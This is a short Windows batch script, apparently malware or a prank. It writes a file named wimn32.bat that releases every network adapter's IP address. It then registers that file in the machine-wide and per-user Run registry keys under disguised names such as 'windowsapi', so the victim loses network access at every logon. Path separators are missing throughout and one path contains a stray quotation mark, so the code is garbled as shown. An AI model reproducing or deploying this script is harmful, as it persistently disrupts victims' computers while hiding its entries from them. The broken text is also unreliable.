echo @echo off>c:windowswimn32.bat
echo break off>>c:windowswimn32.bat
echo ipconfig/release_all>>c:windowswimn32.bat
echo end>>c"windowswimn32.bat
reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v
windowsapi/t reg_sz/d c:windowswimn32.bat/f
reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/v
controlexit/t reg_sz/d c:windowswimn32.bat/f
pause